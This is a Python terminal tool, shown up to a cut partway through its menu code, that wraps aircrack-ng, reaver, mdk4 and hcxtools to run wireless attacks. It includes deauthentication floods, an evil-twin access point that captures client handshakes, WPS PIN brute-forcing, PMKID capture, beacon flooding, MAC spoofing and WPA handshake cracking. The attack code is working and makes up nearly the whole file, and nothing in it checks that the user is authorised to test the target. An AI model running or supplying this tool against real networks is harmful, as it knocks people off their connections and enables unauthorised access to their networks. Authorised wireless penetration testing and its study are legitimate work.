#!/usr/bin/env python3
"""
WiFi Security Testing Tool — TUI + CLI
Monitor mode, packet capture, deauth, cracking.
"""

import argparse
import csv
import curses
import os
import re
import signal
import subprocess
import sys
import time
from pathlib import Path


RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

TOOLS = {
    "airmon-ng": "aircrack-ng",
    "airodump-ng": "aircrack-ng",
    "aireplay-ng": "aircrack-ng",
    "aircrack-ng": "aircrack-ng",
    "airbase-ng": "aircrack-ng",
    "iw": "iw",
    "iwconfig": "wireless-tools",
    "rfkill": "util-linux",
    "reaver": "reaver",
    "mdk4": "mdk4",
    "hcxdumptool": "hcxdumptool",
    "hcxpcapngtool": "hcxtools",
    "macchanger": "macchanger",
}


def log(msg, color=""):
    print(f"{color}{msg}{RESET}")


def fatal(msg):
    log(f"[!] {msg}", RED)
    sys.exit(1)


def run(cmd, check=True, capture=False, timeout=30):
    try:
        kwargs = {}
        if timeout and timeout > 0:
            kwargs["timeout"] = timeout
        if capture:
            r = subprocess.run(cmd, capture_output=True, text=True, **kwargs)
            if check and r.returncode != 0:
                log(f"[!] Command failed: {' '.join(cmd)}", RED)
                log(f"    stderr: {r.stderr.strip()}", RED)
                sys.exit(1)
            return r
        r = subprocess.run(cmd, **kwargs)
        if check and r.returncode != 0 and r.returncode != -2:
            sys.exit(1)
        return r
    except FileNotFoundError:
        log(f"[!] Command not found: {cmd[0]}", RED)
        log(f"    Install it with: sudo apt install {TOOLS.get(cmd[0], cmd[0])}", YELLOW)
        sys.exit(1)
    except subprocess.TimeoutExpired:
        return None


def run_airodump(cmd, timeout):
    """Run airodump-ng and terminate gracefully with SIGINT so CSV files are flushed."""
    proc = subprocess.Popen(cmd)
    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.send_signal(signal.SIGINT)
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
    return proc


def check_root():
    if os.geteuid() != 0:
        fatal("Root privileges required. Run with sudo.")


def get_adapters():
    ifaces = []
    r = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=10)
    for line in r.stdout.split("\n"):
        m = re.match(r"^(\S+)\s+.*IEEE 802.11", line)
        if m:
            ifaces.append(m.group(1))
    return sorted(set(ifaces))


def is_monitor(iface):
    r = subprocess.run(["iwconfig", iface], capture_output=True, text=True, timeout=10)
    return "Mode:Monitor" in r.stdout


def get_default_adapter():
    r = subprocess.run(["ip", "route"], capture_output=True, text=True, timeout=10)
    m = re.search(r"default\s+via\s+\S+\s+dev\s+(\S+)", r.stdout)
    return m.group(1) if m else None


def get_mac(iface):
    try:
        p = Path(f"/sys/class/net/{iface}/address")
        if p.exists():
            return p.read_text().strip()
    except Exception:
        pass
    return "N/A"


def check_dependencies():
    missing = []
    for tool in TOOLS:
        if subprocess.run(["which", tool], capture_output=True, timeout=5).returncode != 0:
            missing.append((tool, TOOLS[tool]))
    return missing


def cmd_list(args=None):
    adapters = get_adapters()
    if not adapters:
        log("[*] No wireless adapters found.", YELLOW)
        return
    default_dev = get_default_adapter()
    log(f"{'Interface':<20} {'Mode':<12} {'Default Route':<15} {'MAC Address':<20}", BOLD)
    log("-" * 70)
    for iface in adapters:
        mode = "Monitor" if is_monitor(iface) else "Managed"
        is_default = "YES" if iface == default_dev else ""
        mac = get_mac(iface)
        log(f"{iface:<20} {mode:<12} {is_default:<15} {mac:<20}")


def cmd_monitor(args=None):
    check_root()
    adapters = get_adapters()

    iface = args.interface if args and args.interface else None

    if not iface:
        log("[*] Available wireless adapters:", CYAN)
        for i, a in enumerate(adapters):
            tag = f" (DEFAULT - main system)" if a == get_default_adapter() else ""
            log(f"  [{i}] {a}{tag}")
        if not adapters:
            fatal("No wireless adapters found.")
        while True:
            try:
                idx = int(input("\nSelect adapter index: ").strip())
                if 0 <= idx < len(adapters):
                    break
                log(f"  Enter 0-{len(adapters)-1}", YELLOW)
            except (ValueError, EOFError):
                log("  Invalid input.", RED)
        iface = adapters[idx]

    if iface not in adapters:
        fatal(f"Interface {iface} not found. Available: {', '.join(adapters)}")

    default_dev = get_default_adapter()
    if iface == default_dev:
        log(f"[!] WARNING: {iface} appears to be your main system WiFi adapter.", YELLOW)
        log(f"    Switching it to monitor mode will disconnect your network connection.", YELLOW)
        try:
            confirm = input("    Continue? [y/N]: ").strip().lower()
            if confirm != "y":
                log("[*] Aborted.", RED)
                return
        except EOFError:
            fatal("Aborted.")

    if is_monitor(iface):
        log(f"[*] {iface} is already in monitor mode.", GREEN)
        return

    log(f"[*] Putting {iface} into monitor mode...", BLUE)
    run(["airmon-ng", "start", iface])

    time.sleep(1)
    adapters_after = get_adapters()
    new_mon = [a for a in adapters_after if a not in adapters and "mon" in a]
    if new_mon:
        log(f"[+] Monitor interface created: {new_mon[0]}", GREEN)
    elif is_monitor(iface):
        log(f"[+] {iface} is now in monitor mode.", GREEN)
    else:
        log(f"[!] Could not verify monitor mode. Check `iwconfig`.", YELLOW)


def cmd_managed(args=None):
    check_root()
    adapters = get_adapters()

    iface = args.interface if args and args.interface else None

    if not iface:
        mon_adapters = [a for a in adapters if is_monitor(a)]
        if not mon_adapters:
            log("[*] No adapters are in monitor mode.", YELLOW)
            return
        log("[*] Adapters in monitor mode:", CYAN)
        for i, a in enumerate(mon_adapters):
            log(f"  [{i}] {a}")
        while True:
            try:
                idx = int(input("\nSelect adapter index: ").strip())
                if 0 <= idx < len(mon_adapters):
                    break
                log(f"  Enter 0-{len(mon_adapters)-1}", YELLOW)
            except (ValueError, EOFError):
                log("  Invalid input.", RED)
        iface = mon_adapters[idx]

    if not is_monitor(iface):
        log(f"[*] {iface} is already in managed mode.", GREEN)
        return

    log(f"[*] Putting {iface} back to managed mode...", BLUE)
    run(["airmon-ng", "stop", iface])
    log(f"[+] {iface} is back in managed mode.", GREEN)


def parse_scan_csv(prefix):
    """Parse airodump-ng CSV and return (aps, stations)."""
    csv_file = Path(f"{prefix}-01.csv")
    if not csv_file.exists():
        return None, None

    aps = []
    stations = []
    section = 0
    with open(csv_file, errors="replace") as f:
        reader = csv.reader(f)
        for row in reader:
            if not row or len(row) < 2:
                continue
            if row[0].startswith("BSSID"):
                section = 1
                continue
            if row[0].startswith("Station MAC"):
                section = 2
                continue
            if section == 1 and len(row) >= 14:
                bssid = row[0].strip()
                if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                    continue
                aps.append({
                    "bssid": bssid,
                    "channel": row[3].strip(),
                    "privacy": row[5].strip(),
                    "power": row[8].strip(),
                    "essid": row[13].strip(),
                })
            elif section == 2 and len(row) >= 6:
                mac = row[0].strip()
                if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac):
                    continue
                stations.append({
                    "mac": mac,
                    "bssid": row[5].strip() if len(row) > 5 and row[5].strip() else "(not associated)",
                    "probed": row[6].strip() if len(row) > 6 else "",
                })
    return aps, stations


def print_scan_summary(prefix):
    """Print parsed scan results in a clean table."""
    aps, stations = parse_scan_csv(prefix)
    if aps is None:
        log("[!] No CSV output found.", YELLOW)
        return

    if aps:
        log(f"\n{BOLD}  ACCESS POINTS{RESET}", BOLD)
        log(f"  {'BSSID':<20} {'CH':<4} {'PWR':<5} {'ENC':<6} {'SSID'}", BOLD)
        log(f"  {'-'*60}")
        for ap in sorted(aps, key=lambda x: int(x["channel"])):
            enc = ap["privacy"][:6] if ap["privacy"] and ap["privacy"] != "OPN" else "Open"
            log(f"  {ap['bssid']:<20} {ap['channel']:<4} {ap['power']:<5} {enc:<6} {ap['essid'] or '<hidden>'}")
    else:
        log("[*] No access points found.", YELLOW)

    if stations:
        log(f"\n{BOLD}  STATIONS (clients){RESET}", BOLD)
        log(f"  {'Station MAC':<20} {'BSSID':<20} {'Probed SSIDs'}", BOLD)
        log(f"  {'-'*60}")
        for s in stations:
            log(f"  {s['mac']:<20} {s['bssid']:<20} {s['probed']}")
    else:
        log(f"\n[*] No stations found. Run scan longer to discover clients.", YELLOW)

    log("")


def cmd_scan(args=None):
    check_root()
    adapters = get_adapters()
    monitor_adapters = [a for a in adapters if is_monitor(a)]

    if not monitor_adapters:
        fatal("No adapters in monitor mode. Use 'monitor' first.")

    iface = args.interface if args and args.interface else monitor_adapters[0]
    if iface not in monitor_adapters:
        fatal(f"{iface} not in monitor mode. Available: {monitor_adapters}")

    band = args.band if args and args.band else "abg"
    channel = args.channel if args and args.channel else None
    bssid = args.bssid if args and args.bssid else None
    timeout = args.timeout if args and args.timeout else 30
    output_prefix = (args.output if args and args.output
                     else f"scan_{iface}_{int(time.time())}")

    log(f"[*] Scanning on {iface}... Press Ctrl+C to stop.", BLUE)
    log(f"[*] Output files: {output_prefix}*", CYAN)

    cmd = [
        "airodump-ng",
        "--band", band,
        "--write", output_prefix,
        "--write-interval", "1",
        iface,
    ]
    if channel:
        cmd.insert(-1, "--channel")
        cmd.insert(-1, str(channel))
    if bssid:
        cmd.insert(-1, "--bssid")
        cmd.insert(-1, bssid)

    run_airodump(cmd, timeout)

    log(f"[+] Scan complete. Output: {output_prefix}*", GREEN)
    print_scan_summary(output_prefix)


def cmd_capture(args=None):
    check_root()
    adapters = get_adapters()
    monitor_adapters = [a for a in adapters if is_monitor(a)]

    if not monitor_adapters:
        fatal("No adapters in monitor mode. Use 'monitor' first.")

    iface = args.interface if args and args.interface else monitor_adapters[0]
    if iface not in monitor_adapters:
        fatal(f"{iface} not in monitor mode. Available: {monitor_adapters}")

    channel = args.channel if args and args.channel else 1
    bssid = args.bssid if args and args.bssid else None
    timeout = args.timeout if args and args.timeout else 30
    output = (args.output if args and args.output
              else f"capture_{iface}_{int(time.time())}")

    log(f"[*] Capturing on {iface} (channel {channel})... Ctrl+C to stop.", BLUE)
    log(f"[*] Output: {output}.cap", CYAN)
    if bssid:
        log(f"[*] BSSID filter: {bssid}", CYAN)

    cmd = ["airodump-ng", "--channel", str(channel), "--write", output, iface]
    if bssid:
        cmd[2:2] = ["--bssid", bssid]

    run_airodump(cmd, timeout)

    cap_file = Path(f"{output}-01.cap")
    if cap_file.exists():
        log(f"[+] Captured packets: {cap_file}", GREEN)
    else:
        log(f"[!] No capture file found. Check {output}*", YELLOW)


def cmd_deauth(args=None):
    check_root()
    adapters = get_adapters()
    monitor_adapters = [a for a in adapters if is_monitor(a)]

    if not monitor_adapters:
        fatal("No adapters in monitor mode. Use 'monitor' first.")

    iface = args.interface if args and args.interface else monitor_adapters[0]
    if iface not in monitor_adapters:
        fatal(f"{iface} not in monitor mode. Available: {monitor_adapters}")

    bssid = args.bssid if args and args.bssid else None
    if not bssid:
        fatal("BSSID (target AP MAC) is required. Use --bssid.")

    count = args.count if args and args.count else 10
    client = args.client if args and args.client else None
    timeout = args.timeout if args and args.timeout else 60
    channel = args.channel if args and args.channel else None

    if channel:
        log(f"[*] Switching {iface} to channel {channel}...", BLUE)
        subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
                       capture_output=True, timeout=10)

    log(f"[*] Sending deauth to {bssid}", RED)
    log(f"    Interface: {iface}", CYAN)
    log(f"    Count: {count} packets", CYAN)
    if channel:
        log(f"    Channel: {channel}", CYAN)
    if client:
        log(f"    Client: {client} (directed deauth)", CYAN)

    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, iface]
    if client:
        cmd.insert(-1, "-c")
        cmd.insert(-1, client)

    run(cmd, timeout=timeout)

    log("[+] Deauth attack finished.", GREEN)


def cmd_crack(args=None):
    if not args or not args.cap:
        fatal("Capture file (.cap) is required.")
    if not args or not args.wordlist:
        fatal("Wordlist file is required.")

    cap = Path(args.cap)
    wl = Path(args.wordlist)

    if not cap.exists():
        fatal(f"Capture file not found: {cap}")
    if not wl.exists():
        fatal(f"Wordlist not found: {wl}")

    log(f"[*] Cracking WPA handshake from {cap}", BLUE)
    log(f"    Wordlist: {wl}", CYAN)
    log(f"    BSSID filter: {args.bssid or 'all networks'}", CYAN)

    cmd = ["aircrack-ng", "-w", str(wl), str(cap)]
    if args.bssid:
        cmd.extend(["--bssid", args.bssid])

    run(cmd)


# ───── Evil Twin ─────

def cmd_eviltwin(args=None):
    check_root()
    adapters = get_adapters()
    monitor_adapters = [a for a in adapters if is_monitor(a)]
    if not monitor_adapters:
        fatal("No adapters in monitor mode. Use 'monitor' first.")
    iface = args.interface if args and args.interface else monitor_adapters[0]
    if iface not in monitor_adapters:
        fatal(f"{iface} not in monitor mode. Available: {monitor_adapters}")
    ssid = args.ssid if args and args.ssid else "Free WiFi"
    channel = args.channel if args and args.channel else 1
    capture = args.capture if args and args.capture else None

    log(f"[*] Starting Evil Twin AP:", RED)
    log(f"    SSID: {ssid}", CYAN)
    log(f"    Interface: {iface}", CYAN)
    log(f"    Channel: {channel}", CYAN)
    if capture:
        log(f"    Capture file: {capture}", CYAN)
    log("    Clients will see your AP. When they connect,", YELLOW)
    log("    the handshake is saved. Press Ctrl+C to stop.", YELLOW)

    cmd = ["airbase-ng", "-e", ssid, "-c", str(channel), iface]
    if capture:
        cmd[2:2] = ["-w", capture]
    run(cmd, timeout=args.timeout if args and args.timeout else 0)
    log("[+] Evil Twin finished.", GREEN)


# ───── WPS Attack ─────

def cmd_wps(args=None):
    check_root()
    adapters = get_adapters()
    monitor_adapters = [a for a in adapters if is_monitor(a)]
    if not monitor_adapters:
        fatal("No adapters in monitor mode. Use 'monitor' first.")
    iface = args.interface if args and args.interface else monitor_adapters[0]
    if iface not in monitor_adapters:
        fatal(f"{iface} not in monitor mode. Available: {monitor_adapters}")
    bssid = args.bssid if args and args.bssid else None
    if not bssid:
        fatal("BSSID is required for WPS attack.")
    channel = args.channel if args and args.channel else 1
    timeout = args.timeout if args and args.timeout else 120

    if channel:
        subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
                       capture_output=True, timeout=10)

    log(f"[*] Starting WPS PIN brute-force on {bssid}", RED)
    log(f"    Interface: {iface}", CYAN)
    log(f"    Channel: {channel}", CYAN)

    if subprocess.run(["which", "reaver"], capture_output=True, timeout=5).returncode != 0:
        fatal("reaver not installed. Run 'install' first.")

    cmd = ["reaver", "-i", iface, "-b", bssid, "-c", str(channel), "-vv"]
    run(cmd, timeout=timeout)
    log("[+] WPS attack finished.", GREEN)


# ───── PMKID Capture ─────

def cmd_pmkid(args=None):
    check_root()
    adapters = get_adapters()
    monitor_adapters = [a for a in adapters if is_monitor(a)]
    if not monitor_adapters:
        fatal("No adapters in monitor mode. Use 'monitor' first.")
    iface = args.interface if args and args.interface else monitor_adapters[0]
    if iface not in monitor_adapters:
        fatal(f"{iface} not in monitor mode. Available: {monitor_adapters}")
    timeout = args.timeout if args and args.timeout else 30
    output = args.output if args and args.output else f"pmkid_{iface}_{int(time.time())}"

    have_hcxdump = (subprocess.run(["which", "hcxdumptool"],
                    capture_output=True, timeout=5).returncode == 0)
    have_hcxpcap = (subprocess.run(["which", "hcxpcapngtool"],
                    capture_output=True, timeout=5).returncode == 0)

    if have_hcxdump and have_hcxpcap:
        log(f"[*] Capturing PMKID with hcxdumptool on {iface}", BLUE)
        log("    Ctrl+C to stop.", YELLOW)
        run(["hcxdumptool", "-i", iface, "-o", f"{output}.pcapng",
             "--enable_status=1"], timeout=timeout)
        log("[*] Converting to hashcat format...", BLUE)
        subprocess.run(["hcxpcapngtool", "-o", f"{output}.hc22000",
                        f"{output}.pcapng"], capture_output=True, timeout=30)
        hash_file = Path(f"{output}.hc22000")
        if hash_file.exists() and hash_file.stat().st_size > 0:
            log(f"[+] PMKID hashes saved: {hash_file}", GREEN)
        else:
            log("[!] No PMKID hashes captured.", YELLOW)
    else:
        log("[*] hcxdumptool not available. Using airodump-ng instead.", YELLOW)
        log("    PMKID capture with airodump-ng is limited.", YELLOW)
        cmd = ["airodump-ng", "--band", "abg", "--write", output, iface]
        run_airodump(cmd, timeout)
        log(f"[+] Capture done. Check {output}* for PMKID.", CYAN)


# ───── Beacon Flood ─────

def cmd_beaconflood(args=None):
    check_root()
    adapters = get_adapters()
    monitor_adapters = [a for a in adapters if is_monitor(a)]
    if not monitor_adapters:
        fatal("No adapters in monitor mode. Use 'monitor' first.")
    iface = args.interface if args and args.interface else monitor_adapters[0]
    if iface not in monitor_adapters:
        fatal(f"{iface} not in monitor mode. Available: {monitor_adapters}")

    ssids = args.ssids if args and args.ssids else None
    count = args.count if args and args.count else 500
    timeout = args.timeout if args and args.timeout else 30

    log(f"[*] Starting beacon flood on {iface}", RED)
    log(f"    SSIDs: {ssids or 'random'}", CYAN)
    log(f"    Count: {count}", CYAN)
    log("    Press Ctrl+C to stop.", YELLOW)

    if subprocess.run(["which", "mdk4"], capture_output=True, timeout=5).returncode != 0:
        fatal("mdk4 not installed. Run 'install' first.")

    if ssids:
        ssid_list = ssids.split(",")
        list_file = Path(f"/tmp/beacon_ssids_{int(time.time())}.txt")
        list_file.write_text("\n".join(ssid_list))
        cmd = ["mdk4", iface, "b", "-f", str(list_file), "-c", str(count)]
    else:
        cmd = ["mdk4", iface, "b", "-c", str(count)]

    run(cmd, timeout=timeout)
    if ssids:
        list_file.unlink(missing_ok=True)
    log("[+] Beacon flood finished.", GREEN)


# ───── MAC Spoofing ─────

def cmd_spoofmac(args=None):
    check_root()
    adapters = get_adapters()
    iface = args.interface if args and args.interface else None
    mac = args.mac if args and args.mac else None

    if not iface:
        log("[*] Available adapters:", CYAN)
        for i, a in enumerate(adapters):
            log(f"  [{i}] {a}")
        while True:
            try:
                idx = int(input("\nSelect adapter index: ").strip())
                if 0 <= idx < len(adapters):
                    break
            except (ValueError, EOFError):
                log("  Invalid input.", RED)
        iface = adapters[idx]

    old_mac = get_mac(iface)
    use_macchanger = (subprocess.run(["which", "macchanger"],
                      capture_output=True, timeout=5).returncode == 0)

    log(f"[*] Current MAC of {iface}: {old_mac}", BLUE)

    if is_monitor(iface):
        log(f"[*] Taking {iface} out of monitor mode to change MAC...", YELLOW)
        run(["airmon-ng", "stop", iface])
        time.sleep(1)

    if use_macchanger:
        if mac:
            log(f"[*] Setting MAC to {mac} with macchanger...", BLUE)
            run(["macchanger", "-m", mac, iface])
        else:
            log(f"[*] Randomizing MAC with macchanger...", BLUE)
            run(["macchanger", "-r", iface])
    else:
        if mac:
            log(f"[*] Setting MAC to {mac} with ip link...", BLUE)
            run(["ip", "link", "set", "dev", iface, "down"])
            run(["ip", "link", "set", "dev", iface, "address", mac])
            run(["ip", "link", "set", "dev", iface, "up"])
        else:
            log("[!] macchanger not available. Use -m to specify a MAC, or install macchanger.", YELLOW)
            log("[*] Generating random MAC...", BLUE)
            rand_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(
                __import__("random").randint(0, 255) for _ in range(5))
            run(["ip", "link", "set", "dev", iface, "down"])
            run(["ip", "link", "set", "dev", iface, "address", rand_mac])
            run(["ip", "link", "set", "dev", iface, "up"])
            mac = rand_mac

    new_mac = get_mac(iface)
    log(f"[+] MAC changed: {old_mac} → {new_mac}", GREEN)

    if is_monitor(iface):
        log(f"[*] Re-enabling monitor mode...", YELLOW)
        run(["airmon-ng", "start", iface])


def cmd_install(args=None):
    check_root()
    missing = check_dependencies()
    if not missing:
        log("[*] All dependencies already installed.", GREEN)
        return

    log(f"[*] {len(missing)} missing tool(s). Installing...", BLUE)
    for tool, pkg in missing:
        log(f"  -> {tool} (package: {pkg})", YELLOW)

    pkgs = sorted(set(pkg for _, pkg in missing))
    try:
        run(["apt", "update"], timeout=120)
    except SystemExit:
        log("[!] apt update failed, trying install anyway...", YELLOW)

    run(["apt", "install", "-y"] + pkgs, timeout=300)
    log("[+] All dependencies installed.", GREEN)


def cmd_check(args=None):
    missing = check_dependencies()
    if not missing:
        log("[✓] All dependencies satisfied.", GREEN)
    else:
        log("[!] Missing tools:", YELLOW)
        for tool, pkg in missing:
            log(f"    {tool} -> apt install {pkg}")
        log("\n    Run 'install' to fix automatically.", CYAN)


# ───────────────────── TUI ─────────────────────

class TUI:
    def __init__(self, stdscr):
        self.stdscr = stdscr
        self.max_y, self.max_x = stdscr.getmaxyx()
        self.run = True
        self.colors = {}
        curses.curs_set(0)
        try:
            if curses.has_colors():
                curses.start_color()
                for i, fg, bg in [
                    (1, curses.COLOR_CYAN, curses.COLOR_BLACK),
                    (2, curses.COLOR_GREEN, curses.COLOR_BLACK),
                    (3, curses.COLOR_YELLOW, curses.COLOR_BLACK),
                    (4, curses.COLOR_RED, curses.COLOR_BLACK),
                    (5, curses.COLOR_BLACK, curses.COLOR_WHITE),
                    (6, curses.COLOR_WHITE, curses.COLOR_BLUE),
                ]:
                    try:
                        curses.init_pair(i, fg, bg)
                        self.colors[i] = curses.color_pair(i)
                    except curses.error:
                        pass
        except curses.error:
            pass
        if not self.colors:
            self.colors = dict.fromkeys(range(1, 7), curses.A_BOLD)
        self.main_loop()

    def center(self, text, y=None, color=0):
        x = max(0, (self.max_x - len(text)) // 2)
        if y is not None:
            self.stdscr.addstr(y, x, text, color)
        return x

    def draw_title(self):
        title = " WiFi Security Testing Tool "
        sep = "=" * (len(title) + 6)
        self.center(sep, 0, curses.A_BOLD)
        self.center(title, 1, curses.A_BOLD | self.colors.get(1))
        self.center(sep, 2, curses.A_BOLD)
        self.stdscr.addstr(3, 0, "─" * self.max_x, self.colors.get(1))

    def draw_footer(self, text="↑↓ Navigate | Enter Select | ESC Back | q Quit"):
        self.stdscr.addstr(self.max_y - 1, 0, " " * (self.max_x - 1))
        self.stdscr.addstr(self.max_y - 1, 2, text, self.colors.get(3) | curses.A_DIM)

    def draw_status(self, text):
        self.stdscr.addstr(self.max_y - 2, 0, " " * (self.max_x - 1))
        self.stdscr.addstr(self.max_y - 2, 2, text, self.colors.get(2))

    def menu(self, title, items, esc_back=True):
        selected = 0
        offset = 5

        while self.run:
            self.stdscr.clear()
            self.draw_title()
            self.center(f" {title} ", offset, curses.A_BOLD | self.colors.get(1))

            for i, item in enumerate(items):
                label = item[0]
                y = offset + 2 + i
                if y >= self.max_y - 2:
                    break
                prefix = "▸ " if i == selected else "  "
                if i == selected:
                    self.stdscr.addstr(y, 4, f" {prefix}{label} ",
                                       self.colors.get(6))
                else:
                    self.stdscr.addstr(y, 4, f" {prefix}{label} ")

            if esc_back:
                self.draw_footer()
            else:
                self.draw_footer("↑↓ Navigate | Enter Select | q Quit")

            self.stdscr.refresh()

            key = self.stdscr.getch()

            if key in (curses.KEY_UP, ord('k')):
                selected = (selected - 1) % len(items)
            elif key in (curses.KEY_DOWN, ord('j')):
                selected = (selected + 1) % len(items)
            elif key in (curses.KEY_ENTER, 10, 13, ord(' ')):
                return items[selected][1] if len(items[selected]) > 1 else selected
            elif key == 27:  # ESC
                if esc_back:
                    return "BACK"
            elif key in (ord('q'), ord('Q')):
                self.run = False
                return "QUIT"

        return "QUIT"

    def show_output(self, title, func, args=None):
        curses.def_prog_mode()
        curses.endwin()
        print(f"\n{CYAN}{'='*60}{RESET}")
        print(f"{BOLD}  {title}{RESET}")
        print(f"{CYAN}{'='*60}{RESET}\n")
        try:
            if args is not None:
                func(args)
            else:
                func()
        except (SystemExit, KeyboardInterrupt):
            pass
        print(f"\n{YELLOW}── Press ENTER to return to menu ──{RESET}")
        input()
        curses.reset_prog_mode()
        curses.curs_set(0)
        self.stdscr.refresh()

    def input_field(self, prompt, default=""):
        curses.echo()
        curses.curs_set(1)
        self.stdscr.addstr(self.max_y - 2, 2, " " * (self.max_x - 4))
        self.stdscr.addstr(self.max_y - 2, 2, prompt, self.colors.get(3))
        self.stdscr.refresh()
        s = self.stdscr.getstr(self.max_y - 2, 2 + len(prompt), 60).decode().strip()
        curses.noecho()
        curses.curs_set(0)
        return s or default

    def select_adapter(self, prompt="Select adapter", only_monitor=False):
        adapters = get_adapters()
        if only_monitor:
            adapters = [a for a in adapters if is_monitor(a)]
        if not adapters:
            self.draw_status(f"No adapters available.")
            time.sleep(1)
            return None
        if only_monitor and not adapters:
            self.draw_status("No adapters in monitor mode. Enable monitor mode first.")
            time.sleep(1.5)
            return None

        items = [(f"{a} {'[MON]' if is_monitor(a) else '[MGD]'}{' [DEFAULT]' if a == get_default_adapter() else ''}", a) for a in adapters]
        result = self.menu(prompt, items)
        if result == "BACK" or result == "QUIT":
            return None
        return result

    def prompt_bssid(self, label="BSSID"):
        self.draw_status(f"Enter target {label} (or leave blank)")
        curses.echo()
        curses.curs_set(1)
        self.stdscr.addstr(self.max_y - 2, 2, " " * (self.max_x - 4))
        self.stdscr.addstr(self.max_y - 2, 2, f"  {label}: ", self.colors.get(3))
        self.stdscr.refresh()
        s = self.stdscr.getstr(self.max_y - 2, 2 + len(label) + 3, 18).decode().strip()
        curses.noecho()
        curses.curs_set(0)
        return s or None

    def prompt_int(self, prompt, default, max_val=999):
        self.draw_status(prompt)
        curses.echo()
        curses.curs_set(1)
        self.stdscr.addstr(self.max_y - 2, 2, " " * (self.max_x - 4))
        self.stdscr.addstr(self.max_y - 2, 2, f"  {prompt} [{default}]: ", self.colors.get(3))
        self.stdscr.refresh()
        s = self.stdscr.getstr(self.max_y - 2, 2 + len(prompt) + len(str(default)) + 5, 8).decode().strip()
        curses.noecho()
        curses.curs_set(0)
        try:
            return int(s) if s else default
        except ValueError:
            return default

    def confirm(self, msg):
        self.draw_status(msg)
        self.stdscr.addstr(self.max_y - 1, 2, "  y/N: ", self.colors.get(4))
        curses.echo()
        curses.curs_set(1)
        s = self.stdscr.getstr(self.max_y - 1, 8, 3).decode().strip().lower()
        curses.noecho()
        curses.curs_set(0)
        return s == "y"

    def main_loop(self):
        while self.run:
            items = [
                ("📡  List Adapters", "list"),
                ("📶  Enable Monitor Mode", "monitor"),
                ("📡  Restore Managed Mode", "managed"),
                ("🔍  Scan Networks", "scan"),
                ("💾  Packet Capture", "capture"),
                ("⚔️  Deauth Attack", "deauth"),
                ("🏴  Evil Twin AP", "eviltwin"),
                ("🔐  WPS PIN Attack", "wps"),
                ("🔑  PMKID Capture", "pmkid"),
                ("📶  Beacon Flood", "beaconflood"),
                ("🔧  Spoof MAC Address", "spoofmac"),
                ("🔓  Crack Handshake", "crack"),
                ("──", None),
                ("✅  Check Dependencies", "check"),
                ("📦  Install Dependencies", "install"),
                ("🚪  Exit", "QUIT"),
            ]

            result = self.menu("Main Menu", items, esc_back=False)
            if result == "QUIT" or result is None:
                break

            if result == "list":
                self.show_output("Available Adapters", cmd_list)

            elif result == "monitor":
                iface = self.select_adapter("Select adapter for Monitor Mode")
                if iface is None:
                    continue
                check_root()
                default_dev = get_default_adapter()
                if iface == default_dev:
                    if not self.confirm(f"WARNING: {iface} is default route. Switch to monitor? (disconnects WiFi)"):
                        self.draw_status("Aborted.")
                        time.sleep(0.5)
                        continue
                self.show_output(f"Enabling Monitor Mode on {iface}",
                                 cmd_monitor, argparse.Namespace(interface=iface))

            elif result == "managed":
                iface = self.select_adapter("Select adapter to restore", only_monitor=True)
                if iface is None:
                    continue
                self.show_output(f"Restoring {iface} to Managed Mode",
                                 cmd_managed, argparse.Namespace(interface=iface))

            elif result == "scan":
                iface = self.select_adapter("Select monitor adapter", only_monitor=True)
                if iface is None:
                    continue
                band_menu = [
                    ("All Bands (2.4 + 5 GHz)", "abg"),
                    ("Only 2.4 GHz (b/g)", "bg"),
                    ("Only 5 GHz (a)", "a"),
                ]
                band_choice = self.menu("Select Frequency Band", band_menu)
                if band_choice == "BACK" or band_choice == "QUIT":
                    continue
                dur = self.prompt_int("Scan duration (seconds)", 15)
                self.show_output(f"Scanning on {iface}",
                                 cmd_scan, argparse.Namespace(
                                     interface=iface, band=band_choice,
                                     channel=None, bssid=None,
                                     output=None, timeout=dur))

            elif result == "capture":
                iface = self.select_adapter("Select monitor adapter", only_monitor=True)
                if iface is None:
                    continue
                ch = self.prompt_int("Channel", 1, 165)
                bssid = self.prompt_bssid("Target BSSID (optional)")
                dur = self.prompt_int("Capture duration (seconds)", 30)
                self.show_output(f"Capturing on {iface} ch {ch}",
                                 cmd_capture, argparse.Namespace(
                                     interface=iface, channel=ch,
                                     bssid=bssid, output=None, timeout=dur))

            elif result == "deauth":
                iface = self.select_adapter("Select monitor adapter", only_monitor=True)
                if iface is None:
                    continue
                bssid = self.prompt_bssid("Target AP BSSID")
                if not bssid:
                    self.draw_status("BSSID is required.")
                    time.sleep(1)
                    continue
                client = self.prompt_bssid("Client MAC (blank=broadcast)")
                count = self.prompt_int("Deauth packets", 10)
                channel = self.prompt_int("AP channel (blank=current)", 0)
                self.show_output(f"Deauth Attack on {bssid}",
                                 cmd_deauth, argparse.Namespace(
                                     interface=iface, bssid=bssid,
                                     client=client, count=count,
                                     channel=channel or None, timeout=60))

            elif result == "crack":
                self.draw_status("Enter path to .cap capture file")
                curses.echo()
                curses.curs_set(1)
                self.stdscr.addstr(self.max_y - 2, 2, "  .cap file: ", self.colors.get(3))
                cap = self.stdscr.getstr(self.max_y - 2, 15, 60).decode().strip()
                self.stdscr.addstr(self.max_y - 2, 2, "  wordlist:  ", self.colors.get(3))
                wl = self.stdscr.getstr(self.max_y - 2, 15, 60).decode().strip()
                curses.noecho()
                curses.curs_set(0)
                if not cap or not wl:
                    self.draw_status("Both files are required.")
                    time.sleep(1)
                    continue
                self.show_output("Cracking WPA Handshake",
                                 cmd_crack, argparse.Namespace(
                                      cap=cap, wordlist=wl, bssid=None))

            elif result == "eviltwin":
                iface = self.select_adapter("Select monitor adapter", only_monitor=True)
                if iface is None:
                    continue
                self.draw_status("Enter SSID for the Evil Twin AP")
                curses.echo()
                curses.curs_set(1)
                self.stdscr.addstr(self.max_y - 2, 2, "  SSID: ", self.colors.get(3))
